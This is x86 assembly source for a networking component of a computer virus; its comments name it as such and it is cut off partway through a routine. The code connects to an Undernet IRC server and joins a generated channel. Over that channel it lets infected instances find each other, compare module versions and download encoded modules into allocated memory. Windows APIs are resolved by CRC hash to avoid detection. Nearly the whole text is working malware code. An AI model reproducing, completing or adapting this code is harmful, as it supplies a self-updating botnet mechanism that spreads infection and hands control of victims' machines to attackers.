   dd      Commodroutine - CommodStart


   CSyscall        macro           I_ID_CoDE

           mov     dword ptr [esp-12], I_ID_CoDE
                   call            CSyscall0
   endm

   C_apicall       macro           crcval, libhandle

           mov     edx,libhandle
           mov     eax,crcval
                   CSyscall        MApiCall

           endm

   Commodroutine:

           loadpointer edx,CommodStart

           loadpointer edx,wsocklib, crt
           push        edx
           mov     ecx,0
           mov     eax,12
               CSyscall        LoadLib
           pop     edx

           cmp     eax,0
           jne     skiploadnet

           CSyscall    registernet

           cmp     eax,0
           je      skiploadnet

           mov     ecx,1
           mov     eax,12
               CSyscall        LoadLib

                   ; call initnetwork

                   sub     esp,12
                   mov     edx,esp
                   mov     dword ptr [edx],12
                   mov     dword ptr [edx+4],0
                   mov     dword ptr [edx+8],0

                   loadpointer     ebx, netinit, crt1

                   push            esp
                   push            0
                   push            0
                   push            ebx
                   push            0
                   push            edx
                   P_apicall       0CA2C0A90h,0            ; Create Thread

                   add             esp,12

           skiploadnet:

           ret

   wsocklib:   db  'wsock32.dll',0

   WM_SOCKET   equ 400h+100h

   hostname    db  'eu.undernet.org',0
   CClassName      db      'ICC',0
   CAppName        db      'WAp',0
   port        dd  6669
   sock        dd  0

   AppHandle   dd  0

   sin:

   sin_family: dw  0
   sin_port:   dw  0
   sin_addr:   dd  0
   sin_zero:   dq  0

   recdata:    dd  0

   netinit:

       sub     esp,32
       loadpointer edx,GetTim, ni11
       mov     dword ptr [edx],esp

       sub     esp,1024+4
       loadpointer edx,recdata, ni12
       mov     dword ptr [edx],esp

           sub             esp,40

           mov             ebx,esp
           mov             dword ptr [ebx],0
           loadpointer     [ebx+4],commproc,cm11
           mov             dword ptr [ebx+8],0
           mov             dword ptr [ebx+12],0

       push        ebx

           push            0
           C_apicall       01017D1A1h,0            ; GetModuleHandle

       pop     ebx

           mov             dword ptr [ebx+16],eax
           mov             dword ptr [ebx+20],0
           mov             dword ptr [ebx+24],0
           mov             dword ptr [ebx+28],0
           mov             dword ptr [ebx+32],0

           loadpointer     [ebx+36],CClassName, cm12

       push    ebx
           C_apicall 0D48A96AAh,1                    ; RegisterClassA

       push    0

       push    0
           C_apicall 01017D1A1h,0                    ; GetModuleHandle

           push    0
           push    eax

       push    0
           push    0
           push    0
           push    0
           push    0
           push    0
           push    0

           sub     esp,4
           loadpointer     [esp+4],CAppName, cm13
           sub     esp,4
           loadpointer     [esp+4],CClassName, cm14

           push    0

           C_apicall 7099fb9ch,1                     ; CreateWindowEx

           push    eax
           call    initconnect

       cmp     eax,'OKAY'
       jne     skipconnect

       call    layer2init

           cmp     eax,'OKAY'
           jne     skipconnect

           sub     esp,44
           mov     edi,esp

           skipbreakit:

                   push    0
                   push    0
                   push    0
                   push    0
                   push    edi
                   C_apicall 03BAC79F3h,1                    ; GetMessageA

           push    eax

                   push    edi
                   push    edi
                   C_apicall 050d9920Ch,1                    ; TranslateMessageA
                   C_apicall 05BFFA45Ch,1                    ; dispatchMessageA

           pop eax

           cmp eax,0
           jne skipbreakit

           skipconnect:

       loadpointer ebx,sock,t5
       push    dword ptr [ebx]
           C_apicall 0F9AAA3C4h,12
           C_apicall 0A3498CD8h,12

       push    0
           C_apicall 790c0575h,0                     ; ExitThread

   commproc:

   cmp dword ptr [esp+umsgval],01h
   je  returnnullk

   cmp dword ptr [esp+umsgval],05
   je  returnnullk

   cmp dword ptr [esp+umsgval],16
   jne skipthisonecomm

   push    0
   C_apicall 07818C6Bh,1                     ; PostQuitMessage

   ret 16

   skipthisonecomm:

   cmp     dword ptr [esp+umsgval],WM_SOCKET
   jne     skipnetwork

       mov eax,dword ptr [esp+lpamval]

       cmp ax,01h                  ; FD_READ
       jne skipnetwork1

                   cmp     eax,0FFFFh
                   ja      skipnetwork

           push    0
           push    1024
           loadpointer ebx,recdata, comp1
           push    dword ptr [ebx]
           loadpointer     ebx,sock, comp2
           push    dword ptr [ebx]
                   C_apicall 80670h,12               ; WSOCK32!recv

           pushad
           call    layer2interp
           popad

           xor eax,eax
           ret 16

       skipnetwork1:

           cmp ax,20h
           jne skipnetwork

           call    layer1uninit

   skipnetwork:

       push    dword ptr [esp+lpamval]
       push    dword ptr [esp+4+wpamval]
       push    dword ptr [esp+4+4+umsgval]
       push    dword ptr [esp+4+4+4+hwndval]

           C_apicall 23ED6274h,1                             ; User32!DefWindowProc
       jmp returnk

   returnnullk:

   xor eax,eax

   returnk:

   ret     16

   ;include debug\debug.asm

   initconnect:

   loadpointer edx,recdata, icn1
   mov edx,[edx]
   push    edx
   push    0101h

   C_apicall 0A568A8D8h,12             ; WSAStartup

   cmp eax,0
   jne ic_finish1

       push    0
       push    1               ; SOCK_STREAM
       push    2               ; AF_INET

       C_apicall   20AA2E0h,12     ; socket

           cmp     eax,0               ; INVALID_SOCKET
       je  ic_finish2

           loadpointer     edx,sock,icc5
                   mov         dword ptr [edx],eax

           loadpointer     edx,sin_family,icc3
                   mov         dword ptr [edx], 2      ; AF_INET

           loadpointer     edx,port,ick1
           push        dword ptr [edx]

           C_apicall       03C3D18h,12     ; htons

           loadpointer     edx,sin_port,icc4
                   mov         word ptr [edx], ax

           sub     esp,4

           loadpointer     [esp+4],hostname,icn2
                   C_apicall   0FB4C7B3Dh,12           ; gethostbyname

                   mov         eax,[eax+12]
                   mov         eax,[eax]
                   mov         eax,[eax]

           loadpointer     edx,sin_addr,icn4
           mov     dword ptr [edx],eax

           push        16

           sub     esp,4
           loadpointer     [esp+4],sin,icn5

           loadpointer     edx,sock,icc9
           push        dword ptr [edx]

           C_apicall       0E5AC660h,12    ; connect

                           cmp     eax, 0          ; SOCKET_ERROR
               jne ic_finish2

                   push    1+20h       ; FD_READ + FD_CLOSE
                   push    WM_SOCKET

                   push    dword ptr [esp+4+4+4]   ; 1st arg in
                                   ; stack
                   loadpointer edx,sock,icc7
                   push    dword ptr [edx]

                   C_apicall 03E7B093h,12  ; WsaAsyncSelect

                                   mov     eax,'OKAY'
                                   ret 4
       ic_finish2:

       push    sock
       C_apicall   0F9AAA3C4h, 12              ; closesocket

   ic_finish1:

   C_apicall  0A3498CD8h,12                    ; WSACleanup

   xor eax,eax

   ret 4

   layer1uninit:

   loadpointer edx,sock,icn91
   push        dword ptr [edx]
   C_apicall   0F9AAA3C4h, 12              ; closesocket
   C_apicall   0A3498CD8h,12               ; WSACleanup

   coocooom:

   loadpointer     edx,hostname,icn92

   cmp     word ptr [edx],'ue'
   jne     swapittoeu

   mov     word ptr [edx],'su'
   jmp     swapittous

   swapittoeu:

   mov     word ptr [edx],'ue'

   swapittous:

   pushad

   pushad
   push            30000
   C_apicall   3126C0h,0
   popad

   push        dword ptr [esp+20h+4+4]
   call        initconnect

   cmp     eax,'OKAY'
   jne     coocooom

   call        layer2init

   popad
   ret

   Message1:     db        'NICK Cec0000',10
   finmes1:      db    0

   Message2:     db        'user Cec0000 "" "" :Cec0000',10
   finmes2:      db    0

   Mes3chk:      db    0

   Message3:     db    'USERHOST Cec0000',10
   finmes3:      db    0

   layer2init:

   C_apicall   17357e7Ah,0         ; GetTickCount

   xor     eax,'!CeC'

   xor     ebx,ebx
   mov     ecx,4

   getitmax:

   push        ecx
   mov     ecx,10
   xor     edx,edx

   div     ecx
   mov     bl,dl
   rol     ebx,8

   pop     ecx

   loop        getitmax

   add     ebx,'0000'

   loadpointer edx,Message1,ly2
   ;cmp        dword ptr [edx+8],'0000'
   ;jne        skipIdFilling

   mov     dword ptr [edx+8-3],'0ceC'
   mov     dword ptr [edx+8],ebx

   mov     dword ptr [edx+8+Message2-Message1-3],'0ceC'
   mov     dword ptr [edx+8+Message2-Message1],ebx
   mov     dword ptr [edx+23+Message2-Message1-3],'0ceC'
   mov     dword ptr [edx+23+Message2-Message1],ebx
   mov     dword ptr [edx+12+Message3-Message1-3],'0ceC'
   mov     dword ptr [edx+12+Message3-Message1],ebx

   sub     ebx,'0000'

   and     ebx,00FFFFFFh

   add     dword ptr [edx+8-3],ebx
   add     dword ptr [edx+8+Message2-Message1-3],ebx
   add     dword ptr [edx+23+Message2-Message1-3],ebx
   add     dword ptr [edx+12+Message3-Message1-3],ebx

   skipIdFilling:

   push        0
   push        finmes1-Message1
   loadpointer edx,Message1,sif76
   push        edx
   loadpointer edx,sock,sif1
   push        dword ptr [edx]
   C_apicall   818A0h,12

   push        0
   push        finmes2-Message2
   loadpointer edx,Message2,sif2
   push        edx
   loadpointer edx,sock,sif31
   push        dword ptr [edx]
   C_apicall   818A0h,12               ; send

   mov     eax,'OKAY'
   ret

   layer2interp:

   loadpointer     esi,recdata,ly2int
   mov     esi,dword ptr [esi]

   layer2interp1:

   push        eax

   lly2:

   cmp     dword ptr [esi],'GNIP'
   jne     notpong

   mov     byte ptr [esi+1],'O'

   call        getendofline
   mov     word ptr [esi+eax-2],0Ah

   dec     eax

   push        eax

   push        0
   push        eax
   push        esi
   loadpointer edx,sock,sif9
   push        dword ptr [edx]
   C_apicall   818A0h,12               ; send

   pop     eax

   mov     word ptr [esi+eax-1],0A0Dh

   loadpointer edx,Mes3chk,ly114

   cmp     byte ptr [edx],0
   jne     skipitMes3

   push        edx

   push        0
   push        finmes3-Message3
   loadpointer edx,Message3,sif8
   push        edx
   loadpointer edx,sock,sif99
   push        dword ptr [edx]
   C_apicall   818A0h,12               ; send

   pop     edx

   inc     byte ptr [edx]

   ; elle reflŠte l'‚tat de mon esprit
   ; viscicitude et aspiration mat‚rielle d‚chue
   ; n'est que frustration une vie bient“t ‚teinte...

   call        InitManage

   skipitMes3:
   notpong:

   call        Managing

   loadnextline:

   pop eax

   getnextline:

   cmp eax,-1
   je  finishloading

   inc esi
   dec     eax

   cmp word ptr [esi-2],0A0Dh
   jne getnextline

   cmp eax,0
   jne dontfinishloading

   finishloading:

   ret

   dontfinishloading:

   jmp layer2interp1

   getendofline:

   xor eax,eax

   getendofline1:

   inc     eax

   cmp word ptr [esi+eax-2],0A0Dh
   jne getendofline1

   ret

   ;
   ; Multi layer networking:
   ;
   ;
   ;   Layer 1 - Wich call winsock functions in order to connect and receive
   ;         sent datas as they arrive
   ;
   ;   Layer 2 - initialise and interprete the protocol used in layer1
   ;       - Interprete data from Layer 3 and send to layer 1
   ;
   ;   Layer 3 - load data from Layer 2 and interprete for Layer 4
   ;         Interprete data from Layer 4 and send to layer 2
   ;
   ;   Layer 4 - interprete and send data to Layer 2
   ;         manage communication between two virus hinstances and
   ;         display their module list version, then ask if any module
   ;         need to be updated
   ;
   ;   Layer 5 - exchange module connection, have packet checksum, divide
   ;         packet, encryption, end crc check and resend operation
   ;         aivable, have also a ping timeout check, don't flood
   ;         (limited to 200 byte/s). Well, module are limited to 8192
   ;         kilobytes
   ;

   cecuser         dd  0

   message4        db 'JOIN '
   channel         db '#000000',0Ah
   finmes4         db 0
   GetTim          dd 0

   InitManage:

   loadpointer edx,GetTim,Im1

   push        dword ptr [edx]
   push        dword ptr [edx]
   C_apicall   0B50DB39h,0,IM1         GetSystemTime
   pop     edx

   movzx       eax,word ptr [edx]

   movzx       ecx,word ptr [edx+6]
   inc     ecx
   shr     ecx,3
   inc     ecx

   xor     edx,edx
   div     ecx

   xor     ebx,ebx
   mov     ecx,4

   gettimnot:

   push        ecx

   xor     edx,edx
   mov     ecx,10
   div     ecx

   rol     ebx,8
   mov     bl,dl

   pop     ecx
   loop        gettimnot

   add     ebx,'0000'
   push        edx
   loadpointer     edx,message4,Im2
   mov     dword ptr [edx+6],ebx           ; get year
   pop     edx

   push        edx
   loadpointer     edx,GetTim,Im9
   mov     edx,dword ptr [edx]
   movzx       eax,word ptr [edx+2]            ; get month

   movzx       ecx,word ptr [edx+6]
   shr     ecx,3
   inc     ecx

   xor     edx,edx
   mul     ecx

   pop     edx

   mov     ecx,10
   xor     edx,edx
   div     ecx
   mov     ah,dl

   add     ax,'00'

   push        edx
   loadpointer     edx,message4,Im3
   mov     word ptr [edx+6+4],ax           ; get month
   pop     edx

   push        0
   push        finmes4-message4
   loadpointer     edx,message4,Im5
   push        edx
   loadpointer     edx,sock,Im4
   push        dword ptr [edx]

   apicall     818A0h,12               ; send

   ret

   Managing:

   mov     byte ptr [esi+eax],0Ah

   push        esi

   Managing1:

   ;cmp        dword ptr [esi],'ORRE'
   ;jne        checkpriv2aa
   ;
   ;checkpriv2aa:
   ;
   ;cmp        dword ptr [esi],'solC'
   ;jne        checkpriv2bb
   ;
   ;checkpriv2bb:

   cmp     dword ptr [esi],'NIOJ'
   jne     checkpriv

   call        layer3init

   checkpriv:

   cmp     dword ptr [esi],'VIRP'
   jne     analismess2

   cmp     dword ptr [esi+4],' GSM'
   je      analismess

   analismess2:

   inc     esi
   cmp     byte ptr [esi],0Ah
   jne     Managing1

   pop     esi

   ret

   analismess:

   mov     eax,dword ptr [esp]     ; hardcoded and added

   push        edx
   mov     edx,dword ptr [eax]
   mov     eax,dword ptr [eax+4]       ; just for cecile communication

   sub     eax,'0000'
   and     eax,00FFFFFFh
   rol     eax,8

   sub     eax,edx
   neg     eax
   pop     edx

   cmp     eax,'ceC:'
   jne     setzeroit

   mov     eax,dword ptr [esp]     ; hardcoded and added
   mov     eax,dword ptr [eax+4]       ; just for cecile communication

   jmp     storeit

   setzeroit:

   mov     eax,0

   storeit:

   loadpointer edx,cecuser,sto1
   mov     dword ptr [edx],eax

   setzeroka:

   add     esi,8

   call        layer3

   pop esi

   ret

   channelsend:

   sub esp,8+7+1+1                 ; - 17
   sub esp,ecx                     ; - 4

   mov edi,esp
   mov ebx,edi

   push    ecx                     ; - 4
   push    ecx                     ; - 4
   push    ecx                     ; - 4

   mov dword ptr [edi],'VIRP'
   mov dword ptr [edi+4],' GSM'

   loadpointer esi,channel,im6
   add edi,8
   mov ecx,7
   rep movsb

   mov byte ptr [edi],' '
   inc edi

   pop ecx                 ; +4

   doitnow:

   mov esi,edx
   rep movsb

   mov byte ptr [edi],0Ah

   pop ecx                 ; +4
   add ecx,8+7+1+1

   push    0
   push    ecx
   push    ebx
   loadpointer edx,sock,im7
   push    dword ptr [edx]
   C_apicall   818A0h,12

   pop ecx                 ; +4
   add esp,ecx                 ; +4
   add esp,8+7+1+1             ; +15
   ret

   usersend:
   ;7*6

   sub esp,8+7+1+1                 ; - 17
   sub esp,ecx

   mov edi,esp
   mov dword ptr [edi],'VIRP'
   mov dword ptr [edi+4],' GSM'

   mov dword ptr [edi+8],' ceC'
   mov dword ptr [edi+8+3],eax

   sub eax,'0000'
   and eax,0FFFFFFh

   add dword ptr [edi+8],eax

   mov byte ptr [edi+8+3+4],' '

   mov ebx,edi

   push    ecx
   push    ecx

   add edi,8+7+1

   jmp doitnow

   ;
   ; Layer 3 protocol, wich make the layer 4 working
   ;

   ;
   ; if something come from the channel, translate it
   ;

   Remote          db      '0000'
   ActualSet       db      0

   layer3init:

   pushad

   loadpointer edx,ActualSet,ly000         ; load actual set
   cmp             byte ptr [edx],0                        ; if we are not in
   ja              dontmakeit                              ; zero mode, dont init

   mov             byte ptr [edx],1                                ;

   mov     ecx,12
   sub     esp,ecx
   mov     edx,esp
   mov     edi,edx
   mov     dword ptr [esp],'A100'          ; send free mode

   push        ecx
   loadpointer     ecx,Message1, ly3
   mov     ecx,dword ptr [ecx+8]

   mov     dword ptr [esp+8],ecx
   pop     ecx

   call        channelsend8

   add     esp,12

   dontmakeit:

   popad

   ret

   layer3:

   ; extra_

   ;call   layer4pingdetect

   ; extra_

   loadpointer  edx,ActualSet, ly1             ;

   cmp byte ptr [edx],3            ; if we are in
   je  awayfromit              ; private mode

   cmp     byte ptr [esi],'#'
   jne     notfromchannel                  ; if we are not in chan

   incrementit:

   inc     esi

   cmp     byte ptr [esi],0Ah
   je      notfromchannel

   ;cmp    dword ptr [esi],'XGSM'          ; little hello to asmod :]
   ;jne    noquit
   ;
   ;push   0
   ;call   ExitProcess

   noquit:

   loadpointer  edx,ActualSet, ly22        ; load the set

   cmp byte ptr [edx],3            ; we are not in step 2
   je  incrementit             ; of communication

   cmp dword ptr [esi],'D100'
   jne notBBreply

   call    checkconfirmation12
   jc  notBBreply

   mov eax,dword ptr [esi+4]           ; confirmation received

   loadpointer  edx,Message1, ly377

   cmp eax,dword ptr [edx+8]
   jne skipthisline                ; check if we have the same
                           ; user than our
   mov eax,dword ptr [esi+8]           ; load remote user

   loadpointer  edx,Remote, ly4            ; save it there
   mov dword ptr [edx],eax

   call    layer4init              ; initalizing virus virus
                           ; transfer
   loadpointer  edx,ActualSet, ly5
   mov byte ptr [edx],3            ; set actual set

   skipthisline:

   ret

   notBBreply:

   cmp dword ptr [esi],'C100'          ; watch if we have a free
   jne notBreply               ; confirmation

   call    checkconfirmation12
   jc  notBreply               ; confirmation

   loadpointer edx,Message1,ly3107
   mov     edx,dword ptr [edx+8]

   cmp     dword ptr [esi+4],edx
   jne     skipBBreply

   push    esi
   push    edi

   mov ecx,16                  ; set it
   sub esp,ecx                 ; we received it

   mov edi,esp
   mov edx,esp

   mov dword ptr [edx],'D100'          ; and then, we confirmed it

   mov eax,dword ptr [esi+8]           ; it's our
   mov dword ptr [edx+4],eax

   loadpointer  ebx,Remote, ly6
   mov dword ptr [ebx],eax         ; set the remote

   loadpointer  ebx,Message1,ly7

   mov eax,dword ptr [ebx+8]           ; my
   mov dword ptr [edx+8],eax           ; load our ID

   call    channelsend12               ; send it

   loadpointer  edx,ActualSet,ly8
   mov byte ptr [edx],3            ; set state

   add esp,16

   pop edi
   pop esi                 ; finish

   skipBBreply:

   ret

   notBreply:

   cmp dword ptr [esi],'B100'          ; check if replied my ask
   jne notM2communication          ;

   call    checkconfirmation12
   jc  notM2communication          ;

   loadpointer edx,ActualSet,ly3105

   cmp     byte ptr [edx],2
   jae     skipBreply

   loadpointer     ecx,Message1, ly3152
   mov     ecx,dword ptr [ecx+8]

   cmp     dword ptr [esi+8],ecx
   jne     skipBreply

   mov     ecx,16

   sub     esp,ecx
   mov     edi,esp

   mov     dword ptr [edi],'C100'

   push        ecx
   loadpointer     ecx,Message1, ly3155
   mov     ecx,dword ptr [ecx+8]

   mov     dword ptr [edi+8],ecx
   pop     ecx

   mov     eax,dword ptr [esi+4]
   mov     dword ptr [edi+4],eax

   mov     edx,edi
   call        channelsend12

   loadpointer edx,ActualSet,ly3187
   mov     byte ptr [edx],2

   add esp,16

   skipBreply:

   ret

   notM2communication:

   cmp     dword ptr [esi],'A100'          ; load Hello
   jne     incrementit

   call    checkconfirmation8
   jc  incrementit

   call    checkoneA
   jnc     incrementit

   push    edi
   mov ecx,16                  ; reply confirmation
   sub     esp,ecx
   mov     edi,esp

   push    edi
   movsd
   inc     byte ptr [edi-1]

   loadpointer edx,Message1,ly9            ; set the message
   mov eax,dword ptr [edx+8]           ; put our ID with 001B

   mov dword ptr [edi],eax

   mov eax,dword ptr [esi]
   mov dword ptr [edi+4],eax

   pop     edi

   mov edx,edi

   call    channelsend12               ; send to chan

   add esp,16
   pop edi

   notfromchannel:

   ret

   awayfromit:

   cmp     byte ptr [esi],'#'          ; if we have a #
   je      incrementit

   push    edx
   loadpointer edx,Remote,ly10         ; then check who is the remote
   mov eax,dword ptr [edx]
   loadpointer edx,cecuser,ly11            ; load the user
   cmp dword ptr [edx],eax
   pop edx

   jne notfromchannel

   add esi,6+2+1               ;

   call    layer4input             ; set the layer

   ; layer 4 in action now!

   ret

   directinput:

   push    edx
   loadpointer edx,Remote,ly12         ; load the remote

   mov eax,dword ptr [edx]
   pop edx
   call    usersend                ; and sun to user

   ret

   layer3to4uninit:

   loadpointer     edx,ActualSet,ly34195
   mov     byte ptr [edx],1        ; return to an idle mode

   ret

   channelsend12:

   pushad
   mov edx,8
   jmp bifurcation1

   channelsend8:

   pushad
   mov edx,4

   bifurcation1:

   mov     ecx,edx
   loadpointer ebx,Message1+8,ly3289
   mov     ebx,dword ptr [ebx]

   getcrcvalthat:
   xor bx,word ptr [edi+ecx+1]
   ror ebx,1
   add ebx,[edi+ecx]
   loop    getcrcvalthat

   mov ah,bh

   mov al,ah
   and     al,0F0h
   and ah,00Fh

   ror al,4
   add ax,'AB'

   mov word ptr [edi+edx+4],ax

   mov ah,bl

   mov al,ah
   and     al,0F0h
   and ah,00Fh

   ror al,4
   add ax,'CD'

   mov word ptr [edi+edx+6],ax

   popad

   call    channelsend

   ret

   checkconfirmation12:

   pushad

   mov edx,8
   jmp chochoconf12

   checkconfirmation8:

   pushad

   mov edx,4

   chochoconf12:

   push    dword ptr [esi+edx+4]
   mov ecx,edx

   loadpointer ebx,cecuser,ly334
   mov ebx,dword ptr [ebx]

   getcrcvalthat1:
   xor bx,word ptr [esi+ecx+1]
   ror ebx,1
   add ebx,[esi+ecx]
   loop    getcrcvalthat1

   mov ah,bh

   mov al,ah
   and     al,0F0h
   and ah,00Fh

   ror al,4
   add ax,'AB'

   ror eax,16

   mov ah,bl

   mov al,ah
   and     al,0F0h
   and ah,00Fh

   ror al,4
   add ax,'CD'

   ror eax,16

   pop edx

   cmp eax,edx
   jne notnothing

   mov eax,-1

   notnothing:

   sub eax,-1

   popad

   ret

   checkoneA:

   pushad

   C_apicall   17357e7Ah,0         ; GetTickCount

   and             eax,11b

   cmp             eax,11b
   jne             dothat

   loadpointer edx,ActualSet,ly3415        ; load actual set

   cmp     byte ptr [edx],2
   jae     dothat

   mov     byte ptr [edx],0        ; reset it

   call            layer3init
   mov             eax,-1

   dothat:

   sub             eax,-1

   popad

   ret

   ;
   ; this is layer4 init
   ;
   ;       direct input:      Call back function each time
   ;
   ;               0:      connection termination
   ;
   ; Serv          1:      Intercommunication Ok, I'm server!
   ; Client    2:  Client initialisation ok, process to data
   ; Serv          3:      Data directory ( 4 byte of directory )
   ; Client        4:      Download X, if none interresting apply 1
   ;
   ;   then 1 switch Client to server, if the server have already processed
   ;   a one, then
   ;
   ;

   pingcounter             dd      0
   uploadinput     db  0
   onepassonly     db  0

   layer4init:

   mov cl,'1'
   call    minisend

   call    setpingcnt
   mov word ptr [edx+4],0          ; nullfify upload input
   mov byte ptr  [edx+5],1

   ret

   layer4uninit:

   call    setpingcnt
   mov dword ptr [edx],0           ; nullfify upload input
   mov word ptr [edx+4],0          ; nullfify upload input
   call    layer3to4uninit

   call    checkoneA

   ret

   ;layer4to5uninit:               ; layer 5 is independent of
   ;                       ; layer 4 as it's a
   ;                       ; continuation, then it's void!
   ;ret

   minisend:

   sub     esp,1
   mov     edx,esp                 ; cl = ascii code
   mov     byte ptr [edx],cl           ; send unique letter/number
                           ; to the input
   mov     ecx,1
   call    directinput             ; send the char

   add     esp,1

   ret

   layer4input:

   call    setpingcnt              ; set the ping counting

   cmp byte ptr [esi],'0'
   jne otherthing0

   call    layer4uninit
   ret

   otherthing0:

   cmp byte ptr [esi],'1'
   jne otherthing

   mov     cl,'2'
   call    minisend                ; is 1 detected ?

   ret

   otherthing:

   cmp byte ptr [esi],'2'          ; confirmation received ?
   jne otherthing2

   CSyscall getvirversion              ; send the version

   add eax,'0000'              ; send version

   mov     ecx,5

   sub     esp,ecx
   mov     edx,esp
   mov     byte ptr [edx],'3'          ; set data directory
   mov dword ptr [edx+1],eax

   call    directinput             ; then

   add     esp,5

   ret

   otherthing2:

   cmp byte ptr [esi],'3'          ; module directory received ?
   jne otherthing3

   CSyscall getvirversion

   mov edx,dword ptr [esi+1]
   sub edx,'0000'              ; load the version directory
                           ; normally
   rol edx,8
   rol eax,8

   mov ecx,4

   getit:

   cmp dl,al                   ;
   jbe skipgettingithigh           ; if new version <= our

   mov al,cl                   ; no, then we have what
   dec al                  ; we are seeking for

   loadpointer ecx,uploadinput,ui1
   mov byte ptr [ecx], al          ; set the upload input

   add al,'0'                  ;

   mov ecx,2

   sub     esp,ecx                 ; load mem from stack
   mov     edx,esp
   mov     byte ptr [edx],'4'          ; ask for module with ID 4
   mov byte ptr [edx+1],al

   call    directinput             ; set it!

   add     esp,2

   jmp finishloop

   skipgettingithigh:

   rol eax,8                   ; load next our version
   rol edx,8                   ; load next remote version

   loop    getit

   loadpointer edx,uploadinput, sgth131    ; set the upload input

   cmp byte ptr [edx+1],1
   jne processallokay

   mov cl,'0'                  ; send close commumincation
   call    minisend

   call    layer4uninit

   ret

   processallokay:

   mov byte ptr [edx+1],1

   mov cl,'1'
   call    minisend

   finishloop:

   ret

   otherthing3:

   cmp     byte ptr [esi],'4'
   jne     otherthing4

   mov     al,byte ptr [esi+1]
   loadpointer     edx, uploadinput,ot3

   sub     al,'0'
   mov     byte ptr [edx],al

   call        layer5init

   ret

   otherthing4:

   call        layer5

   ret

   setpingcnt:

   loadpointer edx, pingcounter,ly4i
   pushad
   mov     esi,edx
   C_apicall   17357E7Ah, 0                ; GetTickCount
   mov     dword ptr [esi],eax
   popad

   ret

   layer4pingdetect:

   pushad

   C_apicall   17357E7Ah, 0                ; GetTickCount
   loadpointer     edx, pingcounter,ly4i210
   mov     edx,[edx]

   cmp     edx,0
   je      skipthisoneone

   sub     eax,edx

   cmp     eax,25000
   jb      skipthisoneone

   call        layer4uninit

   skipthisoneone:

   popad

   ret

   ;
   ; layer 5, packet exchanging
   ;
   ; Server        5:      Packet - Checksum - Size (100 byte sec) - Datas
   ; Client        6:      - Acknowledge - Packet
   ; Client    7:  - Negative Acknowledge, resend
   ;
   ; Serveur       8:      Packet end - Crc of the module
   ; Client    9:  uninit layer 5
   ;
   ; Server:   uninit layer5 , then reply 1
   ;

   destbuffer              dd      0

   layer5init:

   mov     ecx,0                   ; send packet ?
   call    sendpacket

   ret

   layer5:

   cmp     byte ptr [esi],'5'          ; compare if we received
   jne     returnlayer5                ; packet start message

   loadpointer     edx,destbuffer,k1

   cmp     dword ptr [edx],0           ; check that the edx = 0
   jne     skipgetbuffer

   push    edx

   push        4                               ; PAGE_READWRITE
   push        1000h
   push        modulesize
   push        0
   C_apicall       0A2F83D2Ah,0            ; VirtualAlloc

   pop     edx

   mov     dword ptr [edx],eax         ; set memory allocating

   skipgetbuffer:

   push    edx

   mov     ebx,dword ptr [esi+1]           ; get dword at esi+1
   call    hex2val

   mov     ecx,50                  ; calculate pos in buffer
   xor     edx,edx
   mul     ecx                 ; multiply it

   pop     edx
   mov     edx,dword ptr [edx]         ; load destination buffer

   lea     edi,[edx+eax]               ; esi equal position in the
                           ; buffer
   push    esi
   push    edi

   add     esi,7

   mov     ecx,50                  ; drop 50 characters

   copythatnow:

   mov     ax,word ptr [esi]           ; load the ascii
   add esi,2

   call    ascii2hex               ; set it to minus caracter

   sub al,cl
   xor al,66
   inc al
   rol al,cl

   mov     byte ptr [edi],al           ; drop to buffer the caracter
   inc     edi

   loop    copythatnow             ; copy all the buffer

   pop     edi
   pop     esi

   mov     ax,word ptr [esi+5]         ; load the checksum
   call    ascii2hex

   mov     bl,al                   ; translate it to byte

   xor     eax,eax                 ; eax will receive the crc
   mov     ecx,50                  ;

   copythatnow2:

   add     al,byte ptr [edi]           ; load each byte
   ror     al,1

   inc     edi
   loop    copythatnow2                ; dumb little checksum I know

   mov     ecx,dword ptr [esi+1]           ; check if the crc are
                           ; similar, if so, no prob
   cmp     al,bl
   je      noproblem99             ; if crc different, then
                           ; resend it
   sub     esp,5                   ; load small amount of memory
   mov     edx,esp                 ;

   mov     byte ptr [edx],'7'          ; set resend_packet
   jmp     minisendit

   noproblem99:

   sub     esp,5                   ;
   mov     edx,esp                 ;

   mov     byte ptr [edx],'6'          ; set send_next_packet

   minisendit:

   mov     dword ptr [edx+1],ecx           ; set current packet

   mov     ecx,5
   call    directinput             ; send it directly

   add     esp,5

   returnlayer5:

   cmp byte ptr [esi],'6'          ; check if received message
   jne returnlayer6                ; is 6

   mov ebx,dword ptr [esi+1]           ; load send next message
   call    hex2val

   mov ecx,eax

   pushad

   mov ecx,50
   xor edx,edx
   mul ecx                 ; calculate next pointer

   push        eax
   loadpointer ecx,uploadinput,rl55        ; load current uploading
   movzx       ecx,byte ptr [ecx]      ;

   CSyscall    getmodpointer           ; load the module pointer

   mov     edx,eax             ;
   mov     ecx,dword ptr [edx]     ; load module size

   add     ecx,50              ; get next

   pop     eax             ; cmp if next packet
                           ; overrun
   cmp     eax,ecx
   jb      skipdithis

   ;int        3               ; yes ?

   mov     ecx,dword ptr [edx]     ; load this packet size
   sub     ecx,4               ; minus 4
   xor     ebx,ebx             ;

   getthatitit:

   xor     ebx,dword ptr [edx]     ; load byte
   rol     ebx,5
   inc     edx

   loop        getthatitit         ; check all of it

   sub     esp,9
   mov     edx,esp

   mov     byte ptr [edx],'8'      ; set crc check mark
   inc     edx

   mov     ecx,4

   getthatitit2:

   mov     al,bl
   call        hex2ascii
   mov     word ptr [edx],ax       ; save hex char

   add     edx,2
   rol     ebx,8

   loop        getthatitit2            ; print the 4 char

   sub     edx,9
   mov     ecx,9

   call        directinput         ; send the mark-crc

   add     esp,9

   popad
   ret                     ; finished

   skipdithis:

   popad

   inc     ecx
   call        sendpacket          ; send next packet

   returnlayer6:

   cmp     byte ptr [esi],'7'      ; check resend packet
   jne     returnlayer7

   mov     ebx,dword ptr [esi+1]       ; load next packet
   call        hex2val

   mov     ecx,eax

   call        sendpacket          ; send it!

   ret

   returnlayer7:

   cmp     byte ptr [esi],'8'      ; check
   jne     returnlayer8

   mov     ecx,4               ;
   inc     esi

   getlayer8:

   mov     ax,word ptr [esi]       ; convert from buffer
   call        ascii2hex           ; into char

   add     esi,2

   mov     bl,al
   rol     ebx,8

   loop        getlayer8           ; get the 8 bytes of the Crc

   loadpointer edx,destbuffer,lc1      ; load the module in mem

   mov     edx,dword ptr [edx]     ; save it there
   mov     ecx,dword ptr [edx]

   sub     ecx,4
   xor     eax,eax             ; nullify eax

   push        edx

   getthatitit5:

   xor     eax,dword ptr [edx]     ; get the crc of the module
   rol     eax,5               ; in the buffer
   inc     edx

   loop        getthatitit5

   pop     edx

